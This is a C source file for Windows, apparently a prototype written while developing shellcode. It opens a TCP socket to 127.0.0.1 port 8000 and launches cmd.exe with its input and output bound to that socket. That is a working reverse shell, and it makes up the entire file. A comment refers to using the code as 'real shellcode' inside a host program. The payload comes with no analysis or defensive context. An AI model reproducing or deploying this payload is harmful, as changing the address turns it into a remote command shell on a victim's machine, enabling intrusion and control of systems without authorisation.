#ifndef UNICODE
#define UNICODE 1
#endif

#include <WinSock2.h>
#include <strsafe.h>
#include <Windows.h>

// target_link_libraries(untitled winhttp wsock32 ws2_32)
#pragma comment(lib,"Ws2_32.lib")
#pragma warning(disable:4996)

void printLastWSAError() {
	wchar_t buf[256];
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, WSAGetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
	printf("Error: %ls\n", buf);
}

void dprintfWithLastWSAError(
	_In_z_ _Printf_format_string_ const wchar_t* format,
	...
) {
	va_list args;
	va_start(args, format);

	wchar_t buffer[2048];
	StringCchVPrintf(buffer, sizeof(buffer), format, args);
	OutputDebugString(buffer);
	printf("%ls\n", buffer);

	va_end(args);

	printLastWSAError();
}

int main() {
	// Init Winsocket - Not required in real shellcode, as we assume the host program has done this already
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		dprintfWithLastWSAError(L"failed to init wsa\n");
		return 1;
	}

	SOCKET socket = WSASocketW(
		AF_INET, // IPV4
		SOCK_STREAM,
		IPPROTO_TCP,
		NULL, // lpProtocolInfo - Not required, use the specified AF_INET/SOCK_STREAM/IPPROTO_TCP values above
		0, // GROUP - No grouping is required
		0 // dwFlags - Not required
	);

	if (socket == INVALID_SOCKET) {
		dprintfWithLastWSAError(L"failed to open socket\n");
		return 1;
	}

	printf("opened socket %zd\n", socket);

	struct sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(8000);

	if (WSAConnect(
		socket,
		&addr,
		sizeof(addr),
		NULL,
		NULL,
		NULL,
		NULL
	) != 0) {
		dprintfWithLastWSAError(L"failed to open socket\n");

		return 1;
	}

	// Example of sending raw data via WSABUF and WSASend
	//WSABUF buf = { 0 };
	//wchar_t msg[] = L"hello world";
	//buf.buf = msg;
	//buf.len = sizeof(msg);
	//DWORD dwBytesSent = 0;
	//WSAOVERLAPPED SendOverlapped = { 0 };
	//SendOverlapped.hEvent = WSACreateEvent();

	//if (SendOverlapped.hEvent == NULL) {
	//	dprintfWithLastWSAError(L"failed to create heEvent\n");

	//	return 1;
	//}

	//WSASend(
	//	socket, // The open socket
	//	&buf, // The buffer to send
	//	1, // We're sending one buffer
	//	dwBytesSent, // The total bytes that we're sending
	//	0,
	//	&SendOverlapped,
	//	NULL // No completion routine
	//);

	LPCWSTR lpCurrentDirectory = NULL;
	STARTUPINFO startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	// The hStdInput, hStdOutput, and hStdError members contain additional information.
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	PROCESS_INFORMATION processInformation = { 0 };
	startupInfo.hStdError = socket;
	startupInfo.hStdOutput = socket;
	startupInfo.hStdInput = socket;

	wchar_t applicationName[] = L"\"cmd.exe\"";
	BOOL success;
	success = CreateProcessW(
		NULL, // lpApplicationName - Null, as it's supplied via lpCommandLine
		applicationName,  // lpApplicationName
		NULL, // lpProcessAttributes - Null, inherit default
		NULL, // lpThreadAttributes - Null, inherit default
		TRUE, // bInheritHandles - True so that the child will inherit the file descriptor
		0, // CREATE_NO_WINDOW0
		NULL, // lpEnvironment - NULL
		NULL, // lpCurrentDirectory - NULL
		&startupInfo,
		&processInformation
	);

	if (!success) {
		printf("Failed creating process %d\n", GetLastError());
		return 1;
	}

	return 0;
}
